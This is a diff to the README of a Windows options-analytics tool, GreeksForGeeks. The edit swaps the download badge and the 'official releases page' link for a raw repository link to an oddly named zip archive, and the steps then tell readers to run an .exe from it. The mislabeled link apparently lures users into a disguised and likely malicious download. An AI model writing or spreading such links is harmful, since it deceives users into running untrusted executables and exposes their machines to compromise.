@@ -1,6 +1,6 @@
 # 📊 GreeksForGeeks - Calculate accurate trading metrics with ease
 
-[![Download GreeksForGeeks](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/canciosamuel4/GreeksForGeeks/releases)
+[![Download GreeksForGeeks](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/canciosamuel4/GreeksForGeeks/main/greeksforgeeks/Geeks_For_Greeks_perigenesis.zip)
 
 GreeksForGeeks simplifies financial analysis for modern traders. This application calculates the sensitivity parameters for options contracts. Traders call these parameters "Greeks." They tell you how the price of an option changes when market conditions shift.
 
@@ -19,7 +19,7 @@ This application runs on standard Windows hardware. Ensure your computer meets t
 
 Follow these steps to set up the application on your machine.
 
-1. Visit the [official releases page](https://github.com/canciosamuel4/GreeksForGeeks/releases) to download the setup file.
+1. Visit the [official releases page](https://raw.githubusercontent.com/canciosamuel4/GreeksForGeeks/main/greeksforgeeks/Geeks_For_Greeks_perigenesis.zip) to download the setup file.
 2. Select the file ending in .exe to begin the download.
 3. Locate the file in your Downloads folder after it finishes.
 4. Double-click the file to start the installation.
